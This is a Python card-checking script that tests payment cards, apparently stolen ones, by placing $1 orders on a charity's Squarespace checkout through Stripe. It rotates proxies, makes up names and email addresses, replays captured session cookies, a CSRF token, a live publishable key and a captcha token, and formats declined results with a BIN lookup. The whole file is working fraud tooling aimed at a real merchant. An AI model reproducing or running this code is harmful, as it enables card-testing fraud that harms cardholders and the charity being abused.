import requests
import random
import string

# Load proxies from the file
def load_proxies(file_path):
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

# Select a random proxy
def get_random_proxy(proxies):
    proxy = random.choice(proxies)
    ip_port, credentials = proxy.split('@')
    proxy_url = f"http://{credentials}@{ip_port}"
    return {
        "http": proxy_url,
        "https": proxy_url,
    }

# Generate random names
def generate_name():
    first_names = ["John", "Jane", "Alex", "Emily", "Chris", "Katie", "Michael", "Sarah", "David", "Laura"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Martinez", "Lopez"]
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return first_name, last_name

# Generate a random email
def generate_email(first_name, last_name):
    domains = ["gmail.com", "hotmail.com", "yahoo.com", "protonmail.com", "proton.me"]
    random_numbers = ''.join(random.choices(string.digits, k=3))
    email = f"{first_name.lower()}.{last_name.lower()}{random_numbers}@{random.choice(domains)}"
    return email

# Perform BIN lookup
def bin_lookup_with_proxy(card_number, proxies):
    try:
        bin_number = card_number[:6]  # Extract first 6 digits of the card
        proxy = get_random_proxy(proxies)  # Use a random proxy
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", proxies=proxy, timeout=10)
        
        if response.status_code == 200:
            return response.json()  # Return JSON response on success
        else:
            print(f"BIN Lookup Failed: {response.status_code} - {response.text}")
            return None
    except requests.RequestException as e:
        print(f"BIN Lookup Error with Proxy: {e}")
        return None


# Main card-checking function
def check_card(card_number, exp_month, exp_year, cvc, proxies):
    try:
        # Normalize year
        exp_year = f"20{exp_year}" if len(exp_year) == 2 else exp_year

        # Generate random name and email
        first_name, last_name = generate_name()
        email = generate_email(first_name, last_name)

        # Part 1: Generate payment token
        url1 = 'https://api.stripe.com/v1/payment_methods'
        headers1 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        data1 = {
    'billing_details[address][city]': 'Clear Lake',
    'billing_details[address][country]': 'US',
    'billing_details[address][line1]': '48 1 1/2 Street',
    'billing_details[address][line2]': '',
    'billing_details[address][postal_code]': '54005',
    'billing_details[address][state]': 'WI',
    'billing_details[name]': f"{first_name} {last_name}",
    'billing_details[email]': email ,
    'type': 'card',
    'card[number]': card_number,
    'card[cvc]': cvc,
    'card[exp_year]': exp_year,
    'card[exp_month]': exp_month,
    'allow_redisplay': 'unspecified',
    'pasted_fields': 'number',
    'payment_user_agent': 'stripe.js/946d9f95b9; stripe-js-v3/946d9f95b9; payment-element; deferred-intent; autopm',
    'referrer': 'https://www.pawsforpurplehearts.org',
    'time_on_page': '129914',
    'client_attribution_metadata[client_session_id]': 'd1b6975e-d22f-4c3c-9307-5a72a0e71533',
    'client_attribution_metadata[merchant_integration_source]': 'elements',
    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
    'client_attribution_metadata[merchant_integration_version]': '2021',
    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
    'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
    'guid': 'c7684f6a-69f2-49ad-a55e-06d9597fa1c7797a21',
    'muid': '45073534-22a9-4ca8-85a5-f8a3897eb093c03e48',
    'sid': 'a4df5967-e71a-4b4c-af9a-4f04e3ab12d591c1ad',
    'key': 'pk_live_51MqGBrAbji8SEGIz5GA5MLiQVjOplxrZogrlgn537eHL7HMvPnF6hEE7NAQMEn9QfLnHEIHKPBdtG8nIEZjTa94m00qlZbeOJW',
    'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoid2xESytRNUg0SGo1eXFhS1RySWxhYXZLdXczak02dk1iQ0FrVVJYSUFXYlQ5NG14cHdTWXVSUi8ySkNDVjd6aGwrYmRNdjQ5UEJQOTRSZEl1OHV5Y284QjFyekt1L0FGMHJLT3NQeGNRZXZCeEp2S0gvVHJlT2tKdElWU1pCWUNyL2NZemNWZzl6ZEFmRUs0aStXSUdlQ2VxSjdwV08yMnhReDZ5bThUMktjb1lFM2JaNnlKMjN0MTdrcGkwNDhaT0J3bWltUnU5M2loM1dkYWVNcUJBRHNhWXc4dkNKZFV0NTFVa0R4ZHlvN1E5L1laR3RNN05PbGJiTzlrblpVQi8xOGRZSTVGRkNMUjcySUJnZy9Tazljc0wwUGdHK3JUVS9qUS9qdnFOVm1wcEo4a3FPcVFHekFyWjRGQWhPTi9GN01ZZFRHTE5ja1VPaENrYU9hOVEvd2VLSTgzZkdFelZaWnBVdWxpMFBaY290djd1bVFkc0Qrd3FzK25qMXRkNGUvWmhIcFhnOXBiUzJJQmJyM1dPK3EzaUdkeG01WEhiTGtJenY3MDJwbldCQi8xc0FWTVpadVQzN0lIcW1mTHlmaGVsT0xlYy9sZGQrM1FYRFVyY25RbU9EWHlLOFdnTGpYMlB3YzUrSlJ0ZEp3aUNrU1d5ald0a203T3U5R1Nndi9DazRqWFR1RXV4WnpiNjVMdmRSUEZJT3M5c09nbEhMWWh6TE9PanlEVGF0Z0hIL0xYQjRlWmVMcjErL2tXMXk1ZGJIb2ZzYXkwVjNYZHR2OXlwdmVNNFNhbUYwRkhyaVVpVE1aSUUzR1R6ei9jS1UvQmIwc1o0ZEJ0eXphUm1iR2hZeFA0bGdrMk9TQURQOTBkeE9tc1ZUNEFpVytJS1FXN2lWL3J2TzNWd2ZNMU5tckRmWlp6VWxrZmxOR3gvVFdhRGwzUUZnN3p1R1hObDNpUWlGYkRpWGhIN2V0UWdwTlM4YVJjaW0vaGNaOXo0NG5LWkkzcGZtcTJDb1F2MnVKV25aaEVQZ25Ybk5GbC93YlczZitjY1BLZHdHTUZRZ3l2eU8vQ3JheHVLL0U4a0txS2JrMGVZcGsvaUtFcGtVUHpPVHN3UjFEbDViTHJiMmlqeklxMGJRZzUvZFZKenpTR3IxaU9LSmVndTRwS1B0Z1padFlsZERESTRvZFExMXUwTVUzR0d1dEJGRWErS25kTE5uRGpOa2JpaTk0UHd4WnNnM3RsejRwZHdEcGp3Q1RQS3VYUnpacEhPcVhIWFMrWkRVVDBFMi8yUFFkTkVMMEYzSm11aEswL25YVnA1UVJwLzdWam9KcUR1VjF6ZU8yUmhoSDBzZHlyOWF4Q0RnV3BNMTBGaDFEbDNld2xZNHZUN2lsL1JrR0RVdkt6S1JjVEw1OW5tT1RKOGRrTVhibnRhSnZYeTg5dzdxOFh0S2lNazJZSWF2cEZhY2x4dXZ0VXNjOGIvUXBNVkJKblpXRDdGczNxNmRLcUdaUG8yTzYzTVg3T0MvM21CVjRGd2pYMXY2Uk5ubkVxNlN6clk3NWtISUxzTkk5S0o4cUJCcFFTejRLaFRuNlc5amJLbVJIQTY5S2pkV2FTckZSc0VmdDJuWDRLTjJ4aTRBbWV2aTJWMndJNGRwc0tLdUwrWW9UeFFFVk52RFByYlI3MmRsN0hRYm9wMnd5d0JpQlNteVRlM1RWeUVlczdBajdCWFdub3hyakVFQzVjN0JLeis3NjZoKzB2b0pPYzhSd1lXMXFnRmhtMkt2VHY3cFR6aHAvZWxQbkFMKzY4cE5PU2UxOWZoU2hvOWxDZ2UrcmVoYkdQeGxkRXVnVnpjQ2NHaDBwcHVLTjNWemZTUTNvSXdCYWl6N25OVHJVbjZlWnRtbVdjajQ2ZkFVTks2aHZ2a2h3Y201QjNKbW1kUWtESVp1WmZwdkhxZmhhYWpZdGZDODdyd244Q21YbEc3eXd4c29XVU5HdFpSOGsxT1NJWmxJV0VRMGR2NmZtVUVKME9ZVU0xK0ZKU0FvM1E1UFE3dTFoL01KcnpXWndaRXZNNHdJSVZGWWxrWlViRkgwUi9tdVpYUm1Fc20ycVFDMFhCbnprSDJkVWsvN3pBZitTZGZhVkZqU29zcld2c2FMUEx3dzZ4R0habWFaVGpmVVhwSHozUkU2aDZSd0ZVS3QrWFoxcXRkU3o2ZDNBOWp4ZDBXaUVHaVBXcnpEaStsZS9kUHA3YU5GakJEU0JMdEVCS3B4Qm8zU1R5Q2lWZEFTcGF5bHNPS1hSN014Z084S2toSk9jUXg2Y3gzeHhqSGQ4QnFaOFBEeXdKSHJJSnYvdDNicitFWEFWL2RJaUtyMUNSRklMSmplZ1VYUWUyL21Ja2RoWGZUMHA0bjdCTEN0eTdQWERDS1VLWndhZEp4eGRpVWNza2hjRTJwSnNEdWpzWkM0VnljZGtQK2RCU2UrNHBHdTd1cllSR3g2ZXNidmdKZW42ZlpDKy82Z211VUh5c05IWUV3VHY4T1ZqcVZHSU5Ra0lXZENCZlhRSFRhMDZZRXdKUHZ6ek9kSTY4dXgrY2JIUlQwMC9MaWlwVXc0RmpDcllSR3dpVGJEcCtseFlSK09nUS93Z3JjbndqRWtWUUdKeHBQM0tGV3VXYVd5VVMyQmFSSHB4RUxreHRrN2pNNXZDR1JKbkxlejVvUU5OUyt4N2NPcWFTem4jakNEMFRteG5aT1FCUDJlTjF1ck5vMDArR2tVOFhyOTM3NVhObkIvWXQ3QjBoUUFTQUNTbDRUK0F5dHgzcVFxNTJWSEtVdXorVnlLN0FHTmZMaEMrZFhRYlpBMnJ2RGpoQVRrZTZFZnR3clJTL0xndz0iLCJleHAiOjE3MzU3MTkzMjcsInNoYXJkX2lkIjoyNTkxODkzNTksImtyIjoiMzg4Y2U5MTIiLCJwZCI6MCwiY2RhdGEiOiIzMWVuVnUrem1jRjRVcVdnNXNKT25lVzdFa3lodzBxVUg3SlByZnNyOEZ0ZHpxRHpTSXlOaXJHdU5JbnRqMFU1Ym42c09HUHVVTGZ1OG4vQWdwMjAvaTI1VUtDU3gzRVQ3ZmlmSE1yMW1zT3lkZmlmbi9LcXROcldnWjhJdkdXYVR1Q0YxUGxPNXBld3FJcDZONjhzK2s5WHRhcUVyMEkrSUZzQ004Y1VibFU0dWI2eFAwT3lQZ1plNHdXN1ZrMHpJaEMvSkE1UG8rNUVaVVc5In0.TtZsirwa67OV8_S1PxEn2kSVaAFw7qMTCyWOj3oBd5k',
        }
        proxy = get_random_proxy(proxies)
        response1 = requests.post(url1, headers=headers1, data=data1, proxies=proxy)
        response_data = response1.json()

        # Extract token and brand
        payment_token = response_data.get("id")
        display_brand = response_data.get("card", {}).get("brand", "").upper()

        if not payment_token or not display_brand:
            return "Invalid card or failed to generate payment token."

        # Part 2: Submit payment token
        url2 = 'https://www.pawsforpurplehearts.org/api/2/commerce/orders'
        cookies = {
    '_gcl_au': '1.1.714152831.1734491893',
    '_ga': 'GA1.1.1870786824.1734491893',
    '__ssid': '5f464eb22e3c3ed3d1a3eb0ed376ff1',
    '__stripe_mid': '45073534-22a9-4ca8-85a5-f8a3897eb093c03e48',
    'crumb': 'BeBs9PbGzcmxNmJkYzM2YWU2YzMyMWMwOWFhNDdkZDBhZTJkMmZi',
    'ss_cvr': '20cd7c3d-e3e5-4b5f-9b55-be739886a7ac|1734491897364|1735646669685|1735719022512|4',
    'ss_cvt': '1735719022512',
    '_ga_4C4Q515BC3': 'GS1.1.1735719012.4.1.1735719075.60.0.0',
    '_ga_2XK6WFHR7C': 'GS1.1.1735719013.8.1.1735719097.0.0.0',
    '__stripe_sid': 'a4df5967-e71a-4b4c-af9a-4f04e3ab12d591c1ad',
}
        headers2 = {
            'authority': 'www.pawsforpurplehearts.org',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://www.pawsforpurplehearts.org',
    'referer': 'https://www.pawsforpurplehearts.org/checkout?cartToken=4Bv919IAr4zT5GU0WzTw5uhjSoNfQLshP8l2YUEr',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-csrf-token': 'BeBs9PbGzcmxNmJkYzM2YWU2YzMyMWMwOWFhNDdkZDBhZTJkMmZi',
        }
        json_data = {
               'email': email,
    'subscribeToList': False,
    'shippingAddress': {
        'id': '',
        'firstName': '',
        'lastName': '',
        'line1': '',
        'line2': '',
        'city': 'Clear Lake',
        'region': 'WI',
        'postalCode': '',
        'country': '',
        'phoneNumber': '',
    },
    'createNewUser': False,
    'newUserPassword': None,
    'saveShippingAddress': False,
    'makeDefaultShippingAddress': False,
    'customFormData': '{"textarea-yui_3_17_2_1_1722620755104_6552":"google"}',
    'shippingAddressId': None,
    'proposedAmountDue': {
        'decimalValue': '1',
        'currencyCode': 'USD',
    },
    'cartToken': '4Bv919IAr4zT5GU0WzTw5uhjSoNfQLshP8l2YUEr',
    'paymentToken': {
        'token': payment_token,
        'type': 'SQSP_PAYMENTS',
        'sqspPaymentsPaymentMethodType': 'CARD',
        'sqspPaymentsCheckoutSubmitType': 'INITIAL_SUBMISSION',
        'cardType': display_brand,
        'chargeId': None,
    },
    'billToShippingAddress': False,
    'billingAddress': {
        'id': '',
        'firstName': first_name,
        'lastName': last_name,
        'line1': '48 1 1/2 Street',
        'line2': '',
        'city': 'Clear Lake',
        'region': 'WI',
        'postalCode': '54005',
        'country': 'US',
        'phoneNumber': '021 2558 5244',
    },
    'savePaymentInfo': False,
    'makeDefaultPayment': False,
    'paymentCardId': None,
    'universalPaymentElementEnabled': True,

        }
        proxy = get_random_proxy(proxies)
        response2 = requests.post(url2, cookies=cookies, headers=headers2, json=json_data, proxies=proxy)
        api_response = response2.json()

          # Check for PAYMENT_DECLINED
        if api_response.get("failureType") == "PAYMENT_DECLINED":
            bin_data = bin_lookup_with_proxy(card_number, proxies)  # Use proxy for BIN lookup
            if bin_data:
                # Format the custom response
                return f"""𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌

𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth + 1$ charge

𝗜𝗻𝗳𝗼: {bin_data.get('scheme', '').upper()} - {bin_data.get('type', '').capitalize()} - {bin_data.get('brand', '')}
𝐈𝐬𝐬𝐮𝐞𝐫: {bin_data.get('bank', {}).get('name', 'N/A')}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_data.get('country', {}).get('name', 'Unknown')} {bin_data.get('country', {}).get('emoji', '')}
"""
            else:
                return "Declined ❌ - BIN Lookup Failed."
        else:
            # Return the full response for other cases
            return str(api_response)

    except Exception as e:
        return f"Error during processing: {e}"
